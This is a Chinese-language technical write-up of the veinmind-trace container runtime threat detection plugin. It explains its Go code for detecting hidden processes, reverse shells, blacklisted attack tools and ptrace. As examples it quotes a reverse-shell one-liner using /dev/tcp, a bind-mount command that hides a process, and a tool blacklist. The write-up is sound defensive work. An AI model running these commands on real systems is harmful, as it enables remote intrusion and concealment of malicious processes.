# veinmind-trace 运行时威胁检测插件技术分析

**功能概述**: 检测运行中容器的威胁行为，包括隐藏进程、反弹 Shell 等。

**代码位置**: `plugins/go/veinmind-trace/`

---

## 1. 核心架构 - 分析器组合模式

采用观察者模式，支持多个分析器组合：

```go
// plugins/go/veinmind-trace/pkg/analyzer/analyzer.go:7-13
var Group = make([]Analyzer, 0)

type Analyzer interface {
    Scan(container api.Container)
    Result() []*event.TraceEvent
}
```

### 1.1 分析器注册

```go
// plugins/go/veinmind-trace/pkg/analyzer/process.go:14-16
func init() {
    Group = append(Group, &ProcAnalyzer{})
}
```

### 1.2 扫描流程

```go
// plugins/go/veinmind-trace/cmd/cli.go:32-68
func scanContainer(c *cmd.Command, container api.Container) error {
    defer container.Close()

    result := make([]*event.TraceEvent, 0)

    // 遍历所有分析器
    for _, a := range analyzer.Group {
        a.Scan(container)
        result = append(result, a.Result()...)
    }

    // 上报结果
    for _, e := range result {
        reportEvent := &event.Event{
            BasicInfo: &event.BasicInfo{
                ID:         container.ID(),
                Object:     event.NewObject(container),
                Level:      e.Level,
                DetectType: event.Container,
                AlertType:  event.TraceRisk,
                EventType:  event.Risk,
            },
            DetailInfo: &event.DetailInfo{
                AlertDetail: e,
            },
        }
        reportService.Client.Report(reportEvent)
    }

    return nil
}
```

---

## 2. 进程分析器

```go
// plugins/go/veinmind-trace/pkg/analyzer/process.go:18-46
// ProcAnalyzer 检测容器内异常的进程
//  1. 隐藏进程 (mount -o bind 方式)
//  2. 反弹 shell 的进程
//  3. 带有挖矿、黑客工具、可疑进程名的进程
//  4. 包含 Ptrace 的进程
type ProcAnalyzer struct {
    event     []*event.TraceEvent
    container api.Container
}

func (pa *ProcAnalyzer) Scan(container api.Container) {
    pa.event = make([]*event.TraceEvent, 0)
    pa.container = container

    // 1. 隐藏进程检测
    pa.scanHideProcess()

    // 2. 遍历所有进程
    pids, err := container.Pids()
    if err != nil {
        return
    }

    for _, pid := range pids {
        ps, err := container.NewProcess(pid)
        if err != nil {
            continue
        }

        // 3. 反弹 Shell 检测
        pa.scanReverseShell(ps, pid)

        // 4. 恶意进程检测
        pa.scanEvalProcess(ps, pid)

        // 5. Ptrace 检测
        pa.scanPTraceProcess(container, ps, pid)
    }
}

func (pa *ProcAnalyzer) Result() []*event.TraceEvent {
    return pa.event
}
```

---

## 3. 隐藏进程检测

### 3.1 检测原理

攻击者通过 `mount -o bind` 覆盖 `/proc/<pid>` 目录来隐藏进程：

```bash
# 攻击示例
mount -o bind /tmp/fake_proc /proc/12345
```

### 3.2 检测实现

```go
// plugins/go/veinmind-trace/pkg/security/process.go:19-42
func IsHideProcess(fs api.FileSystem) (bool, string) {
    // 隐藏进程检测原理：
    // 1. 劫持 readdir 系统调用 (交给后门检测)
    // 2. mount -o bind 挂载覆盖 (本方法检测)
    // 3. 内核态 rootkit (交给后门检测)

    path := "/proc/mounts"
    if _, err := fs.Stat(path); err == nil {
        file, err := fs.Open(path)
        if err != nil {
            return false, ""
        }
        content, err := io.ReadAll(file)
        if err != nil {
            return false, ""
        }
        return hasMount(string(content))
    }
    return false, ""
}

func hasMount(content string) (bool, string) {
    lines := strings.Split(content, "\n")
    for _, line := range lines {
        row := strings.Split(line, " ")

        if len(row) > 2 {
            // 检查是否有挂载到 /proc/<pid> 的记录
            if ok, _ := regexp.MatchString(`/proc/\d+`, row[1]); ok {
                return true, row[1]
            }
        }
    }
    return false, ""
}
```

### 3.3 事件生成

```go
// plugins/go/veinmind-trace/pkg/analyzer/process.go:48-59
func (pa *ProcAnalyzer) scanHideProcess() {
    if ok, content := security.IsHideProcess(pa.container); ok {
        pa.event = append(pa.event, &event.TraceEvent{
            Name:        "Hiding Process",
            From:        "Process",
            Path:        "/proc/mounts",
            Description: "some hiding process is in /proc/mounts",
            Detail:      content,
            Level:       event.High,
        })
    }
}
```

---

## 4. 反弹 Shell 检测

### 4.1 分层检测思想

基于阿里云安全的分层检测理论：

```go
// plugins/go/veinmind-trace/pkg/security/process.go:44-66
var shList = []string{"bash", "zsh", "sh", "csh", "ksh", "tcsh", "fish", "ash"}

func IsReverseShell(fs api.FileSystem, pid int32, cmdline string) bool {
    // 分层检测思想：
    // 1. 命令行模式检测
    // 2. Socket 连接检测
    // 3. 管道符、伪终端检测 (TODO)
    // 4. 标准语言输入重定向 (TODO)

    // Layer 1: 命令行特征检测
    for _, sh := range shList {
        if strings.Contains(cmdline, sh) && strings.Contains(cmdline, "-i") {
            // Layer 2: Socket 连接检测
            if ok, err := isSocket(fs, pid); ok && err == nil {
                return true
            }
        }
    }

    return false
}
```

### 4.2 Socket 检测

```go
// plugins/go/veinmind-trace/pkg/security/process.go:102-123
func isSocket(fs api.FileSystem, pid int32) (bool, error) {
    fdDir := fmt.Sprintf("/proc/%d/fd", pid)
    dir, err := fs.Open(fdDir)
    if err != nil {
        return false, err
    }
    defer dir.Close()

    // 检查文件描述符 0, 1, 2 (stdin, stdout, stderr)
    for _, fd := range []uint64{0, 1, 2} {
        fdInfo, err := fs.Stat(fmt.Sprintf("%s/%d", fdDir, fd))
        if err != nil {
            return false, err
        }

        fileMode := fdInfo.Mode()
        // 检查是否为 Socket 类型
        return fileMode&os.ModeSocket == os.ModeSocket, nil
    }
    return false, nil
}
```

### 4.3 检测逻辑说明

**经典反弹 Shell 命令**:
```bash
bash -i >& /dev/tcp/10.10.XX.XX/666 0>&1
```

**检测条件**:
1. 命令行包含 shell 程序 (bash, sh 等)
2. 带有 `-i` 参数 (交互式)
3. 标准输入/输出被重定向到 Socket

---

## 5. 恶意进程检测

### 5.1 黑名单检测

```go
// plugins/go/veinmind-trace/pkg/security/process.go:68-78
var hackList = []string{
    "minerd",   // 挖矿程序
    "r00t",     // Rootkit
    "sqlmap",   // SQL 注入工具
    "nmap",     // 端口扫描
    "hydra",    // 密码爆破
    "fscan",    // 内网扫描
    "cdk",      // 容器渗透工具
}

func IsEval(cmdline string) bool {
    cmdList := strings.Split(cmdline, " ")
    for _, cmd := range cmdList {
        for _, hack := range hackList {
            if cmd == hack || strings.HasPrefix(cmd, hack) {
                return true
            }
        }
    }
    return false
}
```

### 5.2 事件生成

```go
// plugins/go/veinmind-trace/pkg/analyzer/process.go:78-93
func (pa *ProcAnalyzer) scanEvalProcess(p api.Process, pid int32) {
    cmdLine, err := p.Cmdline()
    if err != nil {
        return
    }

    if security.IsEval(cmdLine) {
        pa.event = append(pa.event, &event.TraceEvent{
            Name:        "Eval Process",
            From:        "Process",
            Path:        "/proc/" + strconv.Itoa(int(pid)),
            Description: "an eval shell process detect",
            Detail:      cmdLine,
            Level:       event.Critical,
        })
    }
}
```

---

## 6. Ptrace 检测

### 6.1 检测原理

进程被调试时，`/proc/<pid>/status` 中的 `TracerPid` 不为 0：

```go
// plugins/go/veinmind-trace/pkg/security/process.go:80-86
func HasPtraceProcess(content string) bool {
    // 正常情况: TracerPid: 0
    // 被调试时: TracerPid: <非零值>
    if ok, err := regexp.MatchString(`TracerPid:\s+0`, content); !ok && err == nil && strings.Contains(content, "TracerPid") {
        return true
    }
    return false
}
```

### 6.2 检测实现

```go
// plugins/go/veinmind-trace/pkg/analyzer/process.go:95-120
func (pa *ProcAnalyzer) scanPTraceProcess(container api.Container, p api.Process, pid int32) {
    cmdLine, err := p.Cmdline()
    if err != nil {
        return
    }

    // 读取进程状态文件
    file, err := container.Open(filepath.Join("/proc", strconv.Itoa(int(pid)), "status"))
    if err != nil {
        return
    }

    status, err := io.ReadAll(file)
    if err != nil {
        return
    }

    if security.HasPtraceProcess(string(status)) {
        pa.event = append(pa.event, &event.TraceEvent{
            Name:        "Ptrace Process",
            From:        "Process",
            Path:        "/proc/" + strconv.Itoa(int(pid)),
            Description: "an process with Ptrace detect",
            Detail:      cmdLine,
            Level:       event.High,
        })
    }
}
```

---

## 7. 事件级别定义

| 检测项 | 级别 | 说明 |
|--------|------|------|
| 隐藏进程 | High | 可能的 Rootkit 行为 |
| 反弹 Shell | Critical | 确定的攻击行为 |
| 恶意进程 | Critical | 黑客工具/挖矿程序 |
| Ptrace | High | 可能的调试/注入行为 |

---

## 8. 检测流程图

```
┌─────────────────────────────────────────────────┐
│               运行时威胁检测                      │
├─────────────────────────────────────────────────┤
│  1. 隐藏进程检测                                 │
│     └─ 检查 /proc/mounts 中的异常挂载            │
├─────────────────────────────────────────────────┤
│  2. 遍历容器内所有进程                           │
│     ├─ 反弹 Shell 检测                          │
│     │   ├─ 命令行特征: shell -i                 │
│     │   └─ fd 0/1/2 为 Socket                   │
│     ├─ 恶意进程检测                             │
│     │   └─ 匹配黑名单进程名                      │
│     └─ Ptrace 检测                              │
│         └─ TracerPid != 0                       │
└─────────────────────────────────────────────────┘
```

---

*文档生成时间: 2026-01-20*
